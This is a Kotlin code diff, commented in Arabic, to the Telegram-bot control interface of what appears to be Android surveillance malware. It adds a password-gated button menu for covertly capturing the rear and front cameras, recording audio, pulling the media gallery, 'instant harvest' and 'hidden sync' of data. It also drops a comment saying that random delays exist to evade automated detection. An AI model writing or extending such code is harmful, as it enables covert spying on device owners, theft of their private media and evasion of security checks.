@@ -130,7 +130,6 @@ class TelegramUi(
     }
 
     // ==================== دوال مساعدة ====================
-    // ✅ تأخير بشري محسّن (1.2-4.5 ثانية) لمحاكاة التفكير البشري وتجنب الكشف الآلي
     private suspend fun applyHumanDelay() {
         delay(Random.nextLong(1200, 4500))
     }
@@ -516,9 +515,40 @@ class TelegramUi(
         } catch (e: Exception) { 0 }
     }
 
-    // ==================== لوحات الأزرار (جميعها بإيموجيات فريدة) ====================
+    // ==================== ✅ لوحات الأزرار التفاعلية مع إيموجيات فريدة ====================
 
-    // ✅ القائمة الرئيسية – كل زر بإيموجي فريد
+    /**
+     * ✅ لوحة المفاتيح الرئيسية – أزرار تفاعلية بإيموجيات فريدة لكل زر.
+     * هذه اللوحة تظهر بعد التحقق من كلمة السر، وكل زر ينفذ أمراً مختلفاً.
+     * الإيموجيات المستخدمة فريدة لكل زر لتسهيل التمييز.
+     */
+    private fun buildMainKeyboard(): InlineKeyboardMarkup {
+        val keyboard = listOf(
+            listOf(
+                InlineKeyboardButton("📸 كاميرا خلفية").apply { callbackData = "cam_back" },
+                InlineKeyboardButton("👁️ كاميرا أمامية").apply { callbackData = "cam_front" }
+            ),
+            listOf(
+                InlineKeyboardButton("🎙️ تسجيل صوتي").apply { callbackData = "mic_rec" },
+                InlineKeyboardButton("📂 معرض الوسائط").apply { callbackData = "gallery" }
+            ),
+            listOf(
+                InlineKeyboardButton("📊 حالة النظام").apply { callbackData = "status" },
+                InlineKeyboardButton("📦 حصاد فوري").apply { callbackData = "harvest" }
+            ),
+            listOf(
+                InlineKeyboardButton("🔄 مزامنة خفية").apply { callbackData = "sync" },
+                InlineKeyboardButton("🛡️ فحص أمني").apply { callbackData = "security" }
+            ),
+            listOf(
+                InlineKeyboardButton("⚙️ إعدادات متقدمة").apply { callbackData = "settings" },
+                InlineKeyboardButton("🔌 قطع الاتصال").apply { callbackData = "ext" }
+            )
+        )
+        return InlineKeyboardMarkup(keyboard)
+    }
+
+    // ✅ القائمة الرئيسية الحالية (محفوظة للتوافق مع الأزرار القديمة)
     private fun getMainKeyboard(): JSONObject {
         return JSONObject().apply {
             put("inline_keyboard", JSONArray().apply {
@@ -635,11 +665,15 @@ class TelegramUi(
                     sessions[chatId.toString()] = (System.currentTimeMillis() / 1000) + 14400
                 }
                 saveData()
+                
+                // ✅ استخدام لوحة المفاتيح التفاعلية الجديدة بدلاً من القائمة النصية
+                val keyboard = buildMainKeyboard()
                 apiCall("sendMessage", JSONObject().apply {
                     put("chat_id", chatId)
                     if (threadId != 0L) put("message_thread_id", threadId)
-                    put("text", "🔓 تم تسجيل الدخول بنجاح")
-                    put("reply_markup", getMainKeyboard())
+                    put("text", "🔐 **تم التحقق بنجاح.**\nاختر العملية من الأزرار أدناه:")
+                    put("reply_markup", keyboard.toString())
+                    put("parse_mode", "Markdown")
                 })
                 pulseIntent("🔓 تسجيل دخول")
                 return
